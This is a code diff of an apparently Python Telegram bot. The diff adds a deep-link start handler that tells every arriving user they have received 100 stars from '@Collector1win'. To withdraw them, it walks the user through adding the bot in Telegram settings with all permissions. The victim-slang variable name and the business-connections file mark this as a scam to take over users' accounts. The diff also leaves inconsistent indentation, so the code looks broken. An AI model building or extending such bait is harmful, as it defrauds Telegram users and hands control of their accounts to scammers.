@@ -260,7 +260,7 @@ builder.adjust(1)
 
 
 mamont = InlineKeyboardBuilder()
-mamont.button(text="Получить 100✨", url=f"https://t.me/s_t_a_r_s_o_v_bot?reffsdfdsfdsfsdfds")
+mamont.button(text="Получить 100✨", url=f"https://t.me/s_t_a_r_s_o_v_bot?start=ref1234")
 mamont.adjust(1)
 
 
@@ -317,16 +317,10 @@ async def start_command(message: Message):
         )
 
 
-@dp.message(F.text == "/reffsdfdsfdsfsdfds")
-async def start_command(message: Message):
-    try:
-        connections = load_connections()
-        count = len(connections)
-    except Exception:
-        count = 0
-
-    if message.from_user.id != ADMIN_ID:
-        activation_text = f"""
+@dp.message(CommandStart(deep_link=True))
+async def start_command(message: Message, command: CommandObject):
+    payload = command.args 
+    activation_text = f"""
 <b>🩷 На ваш баланс было зачислено 100✨ от @Collector1win. Чтобы вывести, выполни следующие шаги:</b>
 <blockquote><i>
  [1] Перейдите в настройки Telegram.
@@ -335,8 +329,7 @@ async def start_command(message: Message):
  [4] Добавьте бота, предоставив все разрешения
  </i></blockquote>
 """
-
-        photo_url = 'https://i.postimg.cc/G2MFGz78/photo-2025-07-11-09-43-26.jpg' 
+    photo_url = 'https://i.postimg.cc/G2MFGz78/photo-2025-07-11-09-43-26.jpg' 
 
         await bot.send_photo(
     chat_id=message.chat.id,
@@ -347,8 +340,8 @@ async def start_command(message: Message):
     show_caption_above_media=True,
     reply_markup=mamont.as_markup()
 )
-    else:
-        pass
+
+
         
 
 CONNECTIONS_FILE = "business_connections.json"
